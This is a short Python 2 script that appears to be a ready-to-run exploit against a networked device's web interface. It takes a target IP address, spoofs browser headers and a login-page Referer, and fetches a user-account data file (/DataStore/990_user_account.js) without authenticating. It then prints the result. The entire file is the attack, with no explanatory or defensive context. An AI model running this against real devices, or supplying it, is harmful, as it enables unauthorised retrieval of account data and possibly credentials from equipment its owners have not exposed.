import re
import os.path
import urllib2
import base64
import gzip
import zlib
from StringIO import StringIO
from io import BytesIO

def make_requests():
	"""Calls request functions sequentially."""
	response = [None]
	responseText = None

	if(request_ip(response)):
		# Success, possibly use response.
		responseText = read_response(response[0])
                print responseText
		response[0].close()
	else:
		# Failure, cannot use response.
		pass


def read_response(response):
	""" Returns the text contained in the response.  For example, the page HTML.  Only handles the most common HTTP encodings."""
	if response.info().get('Content-Encoding') == 'gzip':
		buf = StringIO(response.read())
		return gzip.GzipFile(fileobj=buf).read()

	elif response.info().get('Content-Encoding') == 'deflate':
		decompress = zlib.decompressobj(-zlib.MAX_WBITS)
		inflated = decompress.decompress(response.read())
		inflated += decompress.flush()
		return inflated

	return response.read()


def request_ip(response):
	"""Tries to request the URL. Returns True if the request was successful; false otherwise.
	http://ip_address/DataStore/990_user_account.js?index=0&amp;pagesize=10
	
	response -- After the function has finished, will possibly contain the response to the request.
	
	"""
	response[0] = None

	try:
		# Create request to URL.
                import sys
                ip = sys.argv[1]
                print ip
		req = urllib2.Request("http://%s/DataStore/990_user_account.js?index=0&pagesize=10"% ip)

		# Set request headers.
		req.add_header("Connection", "keep-alive")
		req.add_header("Accept", "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01")
		req.add_header("X-Requested-With", "XMLHttpRequest")
		req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.59 Safari/537.36")
		req.add_header("Referer", "http://%s/www/login.html"% ip)
		req.add_header("Accept-Encoding", "gzip, deflate, sdch")
		req.add_header("Accept-Language", "en-US,en;q=0.8")
		req.add_header("Cookie", "Language=en")

		# Get response to request.
		response[0] = urllib2.urlopen(req)

	except urllib2.URLError, e:
		# URLError.code existing indicates a valid HTTP response, but with a non-200 status code (e.g. 304 Not Modified, 404 Not Found)
		if not hasattr(e, "code"):
			return False
		response[0] = e
	except:
		return False

	return True


make_requests()

